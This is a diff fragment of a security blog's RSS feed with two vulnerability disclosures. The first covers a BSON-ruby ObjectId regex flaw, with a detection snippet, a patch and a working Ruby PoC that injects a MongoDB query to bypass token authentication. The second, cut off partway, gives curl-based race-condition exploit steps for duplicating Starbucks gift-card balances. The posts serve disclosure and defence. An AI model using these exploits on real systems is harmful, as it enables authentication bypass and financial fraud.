+        <description>&lt;p&gt;TL;DR There’s a subtle bug in BSON-ruby implementation, leading in best case scenario to low-severity DoS, &lt;strong&gt;but most likely to critical BSON Injection&lt;/strong&gt; (similar to SQL injection) - depends on gem versions you use.&lt;/p&gt;
+
+&lt;p&gt;3 years ago &lt;a href=&quot;https://homakov.blogspot.ru/2012/05/saferweb-injects-in-various-ruby.html&quot;&gt;I wrote a blog post&lt;/a&gt; about broken regular expressions in Ruby, &lt;code class=&quot;highlighter-rouge&quot;&gt;^$&lt;/code&gt; meaning new lines &lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt;. Back then I was only able to demonstrate XSS on Github and other websites using “javascript:a()\nhttps://”. I had a feeling there are much worse use cases of this vulnerability and here it is.&lt;/p&gt;
+
+&lt;h2 id=&quot;briefly-about-gems&quot;&gt;Briefly About Gems&lt;/h2&gt;
+
+&lt;p&gt;BSON is a binary-encoded serialization of JSON-like documents. MongoDB uses BSON as the data storage and network transfer format for “documents”.&lt;/p&gt;
+
+&lt;p&gt;Mongoid is an ODM (Object Document Mapper) Framework for MongoDB, written in Ruby. Mongo Mapper is another ODM but less popular one.&lt;/p&gt;
+
+&lt;p&gt;Moped gem is A MongoDB driver for Ruby.&lt;/p&gt;
+
+&lt;p&gt;So Mongoid uses more low-level adapter Moped which uses BSON-ruby (but used to have its own implementation). Mongo Mapper uses Plucky for parsing ObjectId, which also uses BSON-ruby.&lt;/p&gt;
+
+&lt;p&gt;Most likely you’re using Mongoid or Mongo Mapper, but technically the vulnerability is in &lt;code class=&quot;highlighter-rouge&quot;&gt;legal?&lt;/code&gt; of BSON::ObjectId.&lt;/p&gt;
+
+&lt;h2 id=&quot;a-tale-of-one-regression&quot;&gt;A Tale of One Regression&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;legal?&lt;/code&gt; was created in Moped::BSON on Jan 23, 2012. It intended to verify the _id from user input is hexdecimal and is exactly 24 symbols. It looked like this:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;legal?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/^[0-9a-f]{24}$/i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But this nasty &lt;code class=&quot;highlighter-rouge&quot;&gt;^$&lt;/code&gt;-using Ruby code didn’t survive long - &lt;a href=&quot;https://github.com/mongoid/moped/commit/dd5a7c14b5d2e466f7875d079af71ad19774609b#diff-3b93602f64c2fe46d38efd9f73ef5358R24&quot;&gt;on Apr 17, 2012 it was silently replaced&lt;/a&gt; with proper &lt;code class=&quot;highlighter-rouge&quot;&gt;!!str.match(/\A\h{24}\Z/i)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;However, on March 31, 2013 Moped deleted internal BSON module and &lt;a href=&quot;https://github.com/mongoid/moped/commit/b64f937590c69d72fa92255e4c66d3ec126b0ff5#diff-c299a9622b71e55450c761f853668d61R6&quot;&gt;switched to separate BSON gem&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/moped.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;legal?&lt;/code&gt; method successfully &lt;a href=&quot;https://github.com/mongodb/bson-ruby/commit/fef6f75413511d653c76bf924a932374a183a24f#diff-8c8558c185bbb548ccb5a6d6ac4bfee5R191&quot;&gt;migrated to mongodb/bson-ruby&lt;/a&gt; before that (on March 3).&lt;/p&gt;
+
+&lt;p&gt;But on Apr 7 &lt;a href=&quot;https://github.com/mongodb/bson-ruby/commit/21141c78d99f23d5f34d32010557ef19d0f77203#diff-8c8558c185bbb548ccb5a6d6ac4bfee5L219&quot;&gt;an interesting commit happens&lt;/a&gt;. @durran (the maintainer of all those repos), replaces &lt;code class=&quot;highlighter-rouge&quot;&gt;/\A\h{24}\Z/ === string.to_s&lt;/code&gt; with vulnerable &lt;code class=&quot;highlighter-rouge&quot;&gt;string.to_s =~ /^[0-9a-f]{24}$/i ? true : false&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;So from Apr 17 2012 to March 31 2013 moped used ^$, \A\Z until Apr 7 2013, and then ^$ until now.&lt;/p&gt;
+
+&lt;h2 id=&quot;am-i-vulnerable&quot;&gt;Am I Vulnerable?&lt;/h2&gt;
+
+&lt;p&gt;I see, you’re getting bored. Run this code to see if you’re vulnerable:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;defined?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Moped&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;BSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Moped&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;BSON&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;BSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ObjectId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DoS!&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;legal?&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Injection!&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;legal?&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And use this patch if you indeed are! Don’t forget to alert others.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;defined?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Moped&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;BSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Moped&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;BSON&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;BSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ObjectId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;legal?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;sr&quot;&gt;/\A\h{24}\z/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2 id=&quot;the-vulnerability&quot;&gt;The Vulnerability&lt;/h2&gt;
+
+&lt;p&gt;If you’re lucky enough and use old version of Moped, only light version of DoS is possible.&lt;/p&gt;
+
+&lt;p&gt;Wait, did I mention another reason why Regexps in Ruby are horribly designed? There’s \A meaning the beginning and there’s \Z meaning the ending… or a new line. You’re supposed to know it. Because only \z means the ending. But most people don’t care the last &lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/moped2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So if you send something like &lt;code class=&quot;highlighter-rouge&quot;&gt;aaaaaaaaaaaaaaaaaaaaaaaa%0A&lt;/code&gt; (with trailing &lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt;), the &lt;code class=&quot;highlighter-rouge&quot;&gt;legal?&lt;/code&gt; method will still return &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt; because \Z allows the new line. But when Mongo DB receives a corrupted ObjectId it responds with &lt;code class=&quot;highlighter-rouge&quot;&gt;[conn1] Assertion: 10307:Client Error: bad object in message: invalid bson type in object with _id: ObjectId('aaaaaaaaaaaaaaaaaaaaaaaa')&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Which would be OK if Moped properly reacted, but currently it thinks Mongo is down and pings it 39 more times with intervals. In other words it keeps the worker busy for 5 seconds and makes x40 requests to Mongo DB. One way or another, it is Denial of Service.&lt;/p&gt;
+
+&lt;p&gt;But if you’re using a newer version of BSON-ruby with ^$, the attacker can send any data to the socket with something like _id=&lt;code class=&quot;highlighter-rouge&quot;&gt;Any binary data\naaaaaaaaaaaaaaaaaaaaaaaa\nAny binary data&lt;/code&gt;. With following PoC we can bypass any auth token-based system, easily DoS your app, and probably more nasty things - we can write any kind of requests to the socket!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uri'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;BSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$query&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;token&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$gt&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_bson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;id_ish&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;fake_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
+  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x02&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_id&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'H*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_ish&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'V'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'H*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_ish&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;00&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'H*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# looks like:&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# aaaaaaaaaaaaaaaaaaaaaaaa025f6964000f000000%0A%0Aaaaaaaaaaaaaaaaaaaaaaaaa%0A%0A0003247175657279001b00000003746f6b656e000f000000022467740001000000000000&lt;/span&gt;
+
+&lt;span class=&quot;no&quot;&gt;User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_id&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#returns &amp;lt;User _id: 556f840f686f6d6746000000, token: &quot;a&quot;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Thanks to &lt;a href=&quot;https://twitter.com/judofyr&quot;&gt;@judofyr&lt;/a&gt; for the help with this PoC!&lt;/p&gt;
+
+&lt;p&gt;ObjectId is unpacked from hex string and injected as-is into the socket (not sanitized for performance reasons, it’s supposed to be valid ObjectId). It breaks BSON format and redefines or defines new parameters of the BSON object.&lt;/p&gt;
+
+&lt;p&gt;\x83\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xD4\a\x00\x00\x00\x00\x00\x00
+mng_development.users\x00\x00\x00\x00\x00\x00\x00\x00\x00Q\x00\x00\x00\a_id&lt;strong&gt;\x00
+\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x02_id\x00\x0F\x00\x00\x00\xAA
+\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x00\x03$query\x00\e\x00\x00
+\x00\x03token\x00\x0F\x00\x00\x00\x02$gt\x00\x01&lt;/strong&gt;\x00\x00\x00\x00\x00\x00\x00&lt;/p&gt;
+
+&lt;p&gt;Implications of this vulnerability can be huge, so patch your systems asap. Another post about dangers of BSON is coming soon, and that one impacts all platforms.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 04 Jun 2015 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Hacking Starbucks for unlimited coffee</title>
+        <description>&lt;p&gt;This is a story about how I found a way to generate unlimited amount of money on Starbucks gift cards to get life-time supply of coffee or steal a couple of $millions.&lt;/p&gt;
+
+&lt;p&gt;So I got an idea to buy 3 Starbucks cards $5 each.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://sakurity.com/img/sbcards.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;starbucks.com has personal accounts where you can add gift cards, check balances and even transfer money between your gift cards.&lt;/p&gt;
+
+&lt;p&gt;There’s an interesting class of vulnerabilities called &lt;a href=&quot;https://en.wikipedia.org/wiki/Race_condition&quot;&gt;“race condition”&lt;/a&gt;. It’s very common bug for websites with balances, vouchers or other limited resources (mostly money).&lt;/p&gt;
+
+&lt;p&gt;So the transfer of money from card1 to card2 is stateful: first request POST /step1?amount=1&amp;amp;from=wallet1&amp;amp;to=wallet2 saves these values in the session and the second  POST/step2?confirm actually transfers the money and clears the session.&lt;/p&gt;
+
+&lt;p&gt;This makes the exploitation harder because the session gets destroyed right after first confirmation request and second one fails. But this “protection” is still easy to bypass: just use same account from two different browsers (with different session cookies).&lt;/p&gt;
+
+&lt;p&gt;Pseudo code for the exploit:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# prepare transfer details in both sessions&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;starbucks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;step1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;H&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;«&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;»&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;«&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wallet1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wallet2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;»&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;starbucks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;step1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;H&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;«&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;»&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;«&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wallet1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wallet2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;»&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# send $1 simultaneously from wallet1 to wallet2 using both sessions&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;starbucks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;step2?confirm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;H&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;«&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;»&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;starbucks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;step2?confirm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;H&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;«&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;»&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After 5 failed attempts I was about to give up. Race condition is a kind of a vulnerability when you never know if the app is vulnerable, you just need to try some more. Many developers use poor protections like limiting number of requests per IP/account/action, making a random delay or using DB transactions in a wrong way. The only right way to do it is a pessimistic lock (FOR UPDATE clause).&lt;/p&gt;
+
+&lt;p&gt;But yeah, the 6th request created two $5 transfers from wallet1 with 5 dollars balance. Now we have 2 cards with 15 and 5 (20 in total). Now we need a proof of concept, otherwise Starbucks guys can claim there’s no bug or it might be some cache issue.&lt;/p&gt;
+
